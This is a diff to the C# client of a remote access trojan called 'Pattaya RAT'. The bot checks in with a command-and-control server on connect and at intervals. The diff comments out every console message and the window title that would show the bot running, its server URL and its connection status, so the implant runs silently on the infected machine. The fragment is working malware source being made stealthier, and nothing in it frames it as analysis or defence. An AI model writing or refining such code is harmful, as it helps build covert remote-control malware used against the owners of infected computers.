@@ -39,7 +39,7 @@ namespace pattaya_project_client
 
         static async Task MainAsync(string[] args)
         {
-            Console.Title = $"Pattaya RAT client version: {Config.Version} | Server URL {Config.BotServer} | Bot Tag: {Config.Tag}";
+            //Console.Title = $"Pattaya RAT client version: {Config.Version} | Server URL {Config.BotServer} | Bot Tag: {Config.Tag}";
 
             _character = Utils.BotUtil.GenerateChracter();
             LoadBotCommands();
@@ -62,7 +62,7 @@ namespace pattaya_project_client
 
             _client.OnConnected += async (sender, e) =>
             {
-                Console.WriteLine($"Pattaya Bot has been connected to server: {Config.BotServer}");
+                //Console.WriteLine($"Pattaya Bot has been connected to server: {Config.BotServer}");
                 await _client.EmitAsync(Config.BotCheckIn, _character);
 
             };
@@ -78,19 +78,19 @@ namespace pattaya_project_client
                     try
                     {
                         await _client.EmitAsync(Config.BotCheckIn, _character);
-                        Console.WriteLine("Pattaya bot re-checkin");
+                        //Console.WriteLine("Pattaya bot re-checkin");
                     }
                     catch (Exception)
                     {
 
-                        Console.WriteLine("Pattaya bot re-checkin failed");
+                        //Console.WriteLine("Pattaya bot re-checkin failed");
                     }
                     
                 }
             }
             catch (Exception)
             {
-                Console.WriteLine("Pattaya connection timeout");
+                //Console.WriteLine("Pattaya connection timeout");
             }
 
 
